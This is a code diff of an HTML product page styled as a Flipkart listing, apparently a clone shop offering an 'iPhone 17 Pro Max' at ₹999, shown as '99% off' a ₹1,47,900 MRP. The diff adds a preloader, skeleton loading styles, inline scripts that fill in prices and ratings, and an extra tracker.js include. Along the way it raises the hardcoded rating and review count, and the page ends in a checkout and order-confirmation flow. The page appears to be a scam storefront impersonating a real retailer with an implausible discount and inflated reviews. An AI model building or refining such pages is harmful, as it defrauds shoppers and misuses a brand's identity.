@@ -3,14 +3,85 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Apple iPhone 17 Pro Max (Cosmic Orange, 256 GB) - Flipkart</title>
+  <title>Flipkart - Online Shopping</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="product.css">
   <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='6' fill='%232874f0'/><text x='50%25' y='68%25' font-size='20' font-weight='bold' font-family='sans-serif' fill='%23ffe11b' text-anchor='middle'>f</text></svg>">
   <script src="/assets/security-shield.js"></script>
+  <script>
+    /* ⚡ Flipkart Instant Preloader: Prevents FOUC / wrong product flash */
+    (function() {
+      try {
+        var params = new URLSearchParams(window.location.search);
+        var pid = params.get('id');
+        if (!pid) return;
+        var p = null;
+        var cached = sessionStorage.getItem('fk_active_product_' + pid);
+        if (cached) {
+          try { p = JSON.parse(cached); } catch(e) {}
+        }
+        if (!p) {
+          var last = sessionStorage.getItem('fk_last_active_product');
+          if (last) {
+            try {
+              var lp = JSON.parse(last);
+              if (lp && (String(lp.id || '').toLowerCase() === String(pid).toLowerCase() || String(lp._id || '').toLowerCase() === String(pid).toLowerCase())) {
+                p = lp;
+              }
+            } catch(e) {}
+          }
+        }
+        if (!p) {
+          var catStr = sessionStorage.getItem('fk_catalog') || localStorage.getItem('fk_catalog');
+          if (catStr) {
+            try {
+              var list = JSON.parse(catStr);
+              if (Array.isArray(list)) {
+                var target = String(pid).toLowerCase();
+                p = list.find(function(item) {
+                  return String(item.id || '').toLowerCase() === target ||
+                         String(item._id || '').toLowerCase() === target ||
+                         (target === 'iphone17' && (item.id === 'apple-iphone-17-pro-max-256-gb' || item.id === 'iphone17')) ||
+                         (target === 'iphone16' && (item.id === 'apple-iphone-16-pro-max-256-gb' || item.id === 'iphone16')) ||
+                         (target === 'iphone15' && (item.id === 'apple-iphone-15-pro-max-blue-titanium-256-gb' || item.id === 'iphone15'));
+                });
+              }
+            } catch(e) {}
+          }
+        }
+        if (p) {
+          window.__PRELOADED_PRODUCT__ = p;
+          document.title = (p.title1 || p.name || 'Flipkart') + ' - Flipkart';
+        }
+      } catch(e) {}
+    })();
+  </script>
   <style>
+    /* Flipkart Skeleton Shimmer */
+    .skeleton-box {
+      background: linear-gradient(90deg, #f0f0f0 25%, #f8f8f8 50%, #f0f0f0 75%);
+      background-size: 200% 100%;
+      animation: fkShimmer 1.5s infinite;
+      border-radius: 4px;
+    }
+    @keyframes fkShimmer {
+      0% { background-position: 200% 0; }
+      100% { background-position: -200% 0; }
+    }
+    .skeleton-img-placeholder {
+      width: 240px;
+      height: 280px;
+      max-width: 80%;
+      border-radius: 8px;
+      margin: 0 auto;
+    }
+    .skeleton-text-line {
+      height: 16px;
+      margin-bottom: 6px;
+      border-radius: 4px;
+    }
     /* Checkout Drawer Styles */
     .checkout-modal-overlay {
       position: fixed;
@@ -306,41 +377,29 @@
       <!-- Carousel Viewport & Track -->
       <div class="carousel-viewport" id="carouselViewport">
         <div class="carousel-track" id="carouselTrack">
-          <!-- Slide 1 (Hero shot matching screenshot 1 with tagline) -->
-          <div class="carousel-slide">
-            <img src="assets/images/iphone17/hero.jpg" alt="Apple iPhone 17 Pro Max Cosmic Orange" onerror="this.src='https://rukminim2.flixcart.com/image/800/1070/xif0q/mobile/f/v/m/-original-imahft6chnx2vbuy.jpeg?q=90'">
-          </div>
-          <!-- Slide 2 -->
-          <div class="carousel-slide">
-            <img src="assets/images/iphone17/back.jpg" alt="Apple iPhone 17 Pro Max Back View" onerror="this.src='https://rukminim2.flixcart.com/image/800/1070/xif0q/mobile/m/n/c/-original-imahft6c3rbjysmg.jpeg?q=90'">
-          </div>
-          <!-- Slide 3 -->
-          <div class="carousel-slide">
-            <img src="assets/images/iphone17/camera.jpg" alt="Apple iPhone 17 Pro Max Camera Zoom" onerror="this.src='https://rukminim2.flixcart.com/image/800/1070/xif0q/mobile/t/1/p/-original-imahft6cag2fggja.jpeg?q=90'">
-          </div>
-          <!-- Slide 4 -->
-          <div class="carousel-slide">
-            <img src="assets/images/iphone17/front.jpg" alt="Apple iPhone 17 Pro Max Front Display" onerror="this.src='https://rukminim2.flixcart.com/image/800/1070/xif0q/mobile/x/c/q/-original-imahft5njwbfyz5u.jpeg?q=90'">
-          </div>
-          <!-- Slide 5 -->
-          <div class="carousel-slide">
-            <img src="assets/images/iphone17/side.jpg" alt="Apple iPhone 17 Pro Max Titanium Side" onerror="this.src='https://rukminim2.flixcart.com/image/800/1070/xif0q/mobile/z/v/8/-original-imahft6cjegrw5sj.jpeg?q=90'">
-          </div>
-          <!-- Slide 6 -->
-          <div class="carousel-slide">
-            <img src="assets/images/iphone17/box.jpg" alt="Apple iPhone 17 Pro Max Box Accessories" onerror="this.src='https://rukminim2.flixcart.com/image/800/1070/xif0q/mobile/p/o/c/-original-imahft5nzmgz2agc.jpeg?q=90'">
+          <div class="carousel-slide" id="carouselInitialSlide">
+            <div class="skeleton-box skeleton-img-placeholder" id="carouselSkeletonBox"></div>
           </div>
         </div>
       </div>
+      <script>
+        (function() {
+          if (window.__PRELOADED_PRODUCT__) {
+            var p = window.__PRELOADED_PRODUCT__;
+            var img = p.img1 || (p.images && p.images[0]) || (p.colors && p.colors[0] && (p.colors[0].color_img || (p.colors[0].images && p.colors[0].images[0])));
+            if (img) {
+              var track = document.getElementById('carouselTrack');
+              if (track) {
+                track.innerHTML = '<div class="carousel-slide"><img src="' + img + '" alt="' + (p.name || '') + '" loading="eager"></div>';
+              }
+            }
+          }
+        })();
+      </script>
 
       <!-- Carousel Indicator Dots -->
       <div class="carousel-dots" id="carouselDots">
         <div class="carousel-dot active"></div>
-        <div class="carousel-dot"></div>
-        <div class="carousel-dot"></div>
-        <div class="carousel-dot"></div>
-        <div class="carousel-dot"></div>
-        <div class="carousel-dot"></div>
       </div>
     </section>
 
@@ -351,35 +410,65 @@
       <div class="product-brand-header" id="productBrandHeader">
         <div class="brand-badge-pill" id="brandBadgePill">
           <span class="brand-svg-logo" id="brandSvgLogo"></span>
-          <span class="brand-title-name" id="brandTitleName">Apple</span>
+          <span class="brand-title-name" id="brandTitleName"></span>
         </div>
         <span class="official-store-badge"><i class="bi bi-shield-fill-check"></i> Official Store</span>
       </div>
 
-      <h1 class="product-title" id="productTitle">Apple iPhone 17 Pro Max (Cosmic Orange, 256 GB)</h1>
+      <h1 class="product-title" id="productTitle">
+        <span class="skeleton-box skeleton-text-line" style="display:block; width:88%; height:18px;"></span>
+        <span class="skeleton-box skeleton-text-line" style="display:block; width:58%; height:18px;"></span>
+      </h1>
 
       <div class="rating-row">
         <div class="rating-badge">
-          <span id="ratingVal">4.6</span>
+          <span id="ratingVal">4.8</span>
           <svg width="10" height="10" viewBox="0 0 24 24" fill="#ffffff">
             <path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/>
           </svg>
         </div>
-        <span class="rating-text" id="reviewsCountVal">500 Ratings & Reviews</span>
+        <span class="rating-text" id="reviewsCountVal">3,420 Ratings & Reviews</span>
         <img src="assets/images/fk_assured.png" alt="Flipkart Assured" class="fk-assured-logo" onerror="this.src='https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png'">
       </div>
 
       <div class="pricing-row">
         <span class="discount-val" id="discountVal">99% off</span>
-        <span class="mrp-val" id="mrpVal">₹1,47,900</span>
-        <span class="selling-price-val" id="sellingPriceVal">₹999</span>
+        <span class="mrp-val" id="mrpVal"></span>
+        <span class="selling-price-val" id="sellingPriceVal"></span>
       </div>
+
+      <script>
+        (function() {
+          if (window.__PRELOADED_PRODUCT__) {
+            var p = window.__PRELOADED_PRODUCT__;
+            var tEl = document.getElementById('productTitle');
+            if (tEl) tEl.textContent = p.title2 || p.name || p.title1 || '';
+            var sp = Number(p.selling_price || 999);
+            var mrp = Number(p.mrp || 147900);
+            var disc = mrp > sp ? Math.round(((mrp - sp) / mrp) * 100) : 99;
+            var spEl = document.getElementById('sellingPriceVal');
+            if (spEl) spEl.textContent = '₹' + sp.toLocaleString('en-IN');
+            var mrpEl = document.getElementById('mrpVal');
+            if (mrpEl) mrpEl.textContent = '₹' + mrp.toLocaleString('en-IN');
+            var dEl = document.getElementById('discountVal');
+            if (dEl) dEl.textContent = disc + '% off';
+            var wowEl = document.getElementById('wowPriceVal');
+            if (wowEl) wowEl.textContent = '₹' + Number(p.wow_price || sp).toLocaleString('en-IN');
+            var brandEl = document.getElementById('brandTitleName');
+            if (brandEl && p.brand) brandEl.textContent = p.brand;
+            var rVal = document.getElementById('ratingVal');
+            if (rVal && p.rating) rVal.textContent = p.rating;
+            var rCnt = document.getElementById('reviewsCountVal');
+            if (rCnt && p.reviews_count) rCnt.textContent = Number(p.reviews_count).toLocaleString('en-IN') + ' Ratings & Reviews';
+          }
+        })();
+      </script>
 
       <!-- Color Variants Block -->
       <div class="variants-block" id="colorVariantsBlock" style="display: none;">
         <div class="variant-label-row">
           <span class="v-label">Color:</span>
-          <strong class="v-selected" id="selectedColorName">Cosmic Orange</strong>
+          <strong class="v-selected" id="selectedColorName"></strong>
         </div>
         <div class="color-swatches-row" id="colorSwatchesRow"></div>
       </div>
@@ -475,8 +564,8 @@
           </svg>
         </div>
         <div class="warranty-banner-info">
-          <div class="warranty-banner-headline" id="warrantyBannerHeadline">Apple Official 1-Year Limited Warranty</div>
-          <div class="warranty-banner-sub" id="warrantyBannerSub">100% Genuine Apple product with 7 Days Replacement Guarantee and free doorstep pickup.</div>
+          <div class="warranty-banner-headline" id="warrantyBannerHeadline">Official 1-Year Brand Warranty</div>
+          <div class="warranty-banner-sub" id="warrantyBannerSub">100% Genuine product with 7 Days Replacement Guarantee and free doorstep pickup.</div>
         </div>
       </div>
     </section>
@@ -485,12 +574,7 @@
     <section class="detail-section" id="highlightsContainer">
       <h2 class="detail-heading">Highlights</h2>
       <ul class="highlights-list" id="highlightsList">
-        <li>256 GB ROM | Super Retina XDR OLED Display</li>
-        <li>17.53 cm (6.9 inch) ProMotion 120Hz Always-On Display</li>
-        <li>48MP + 48MP + 48MP Pro Triple Camera System | 12MP TrueDepth Front</li>
-        <li>A19 Pro Bionic Chip with 6-Core GPU & Neural Accelerator</li>
-        <li>Aerospace-Grade Titanium Enclosure with Ceramic Shield Gen 3</li>
-        <li>1 Year Manufacturer Warranty on Phone & 6 Months on Accessories</li>
+        <!-- Populated dynamically via product.js -->
       </ul>
     </section>
 
@@ -514,9 +598,7 @@
     <section class="detail-section">
       <h2 class="detail-heading">Product Description</h2>
       <div class="description-images-box" id="descImagesBox">
-        <img src="assets/images/iphone17/camera.jpg" alt="Apple Camera Innovation" loading="lazy">
-        <img src="assets/images/iphone17/back.jpg" alt="Cosmic Orange Titanium Finish" loading="lazy">
-        <img src="assets/images/iphone17/front.jpg" alt="Dynamic Island and Super Retina Display" loading="lazy">
+        <!-- Populated dynamically via product.js -->
       </div>
     </section>
 
@@ -581,12 +663,12 @@
       </div>
 
       <div class="drawer-product-summary">
-        <img src="assets/images/iphone17/hero.jpg" id="drawerThumb" alt="Product">
+        <img src="" id="drawerThumb" alt="Product" style="object-fit: contain;">
         <div class="drawer-product-info">
-          <div class="drawer-product-title" id="drawerTitle">Apple iPhone 17 Pro Max (Cosmic Orange, 256 GB)</div>
+          <div class="drawer-product-title" id="drawerTitle">Loading...</div>
           <div class="drawer-product-prices">
-            <span class="drawer-price" id="drawerPrice">₹999</span>
-            <span class="drawer-mrp" id="drawerMrp">₹1,47,900</span>
+            <span class="drawer-price" id="drawerPrice"></span>
+            <span class="drawer-mrp" id="drawerMrp"></span>
           </div>
         </div>
       </div>
@@ -630,12 +712,13 @@
     <div class="success-card">
       <div class="success-icon-wrap">✓</div>
       <div class="success-title">Order Confirmed!</div>
-      <div class="success-sub">Thank you for shopping on Flipkart. Your Apple iPhone 17 Pro Max will be delivered within 2 days with Express Free delivery.</div>
+      <div class="success-sub" id="orderSuccessMsg">Thank you for shopping on Flipkart. Your order will be delivered within 2 days with Express Free delivery.</div>
       <button class="success-btn" id="orderDoneBtn">Back to Home</button>
     </div>
   </div>
 
   <script src="/assets/RemoteStore.js"></script>
+  <script src="/assets/tracker.js"></script>
   <script src="product.js"></script>
 </body>
 </html>
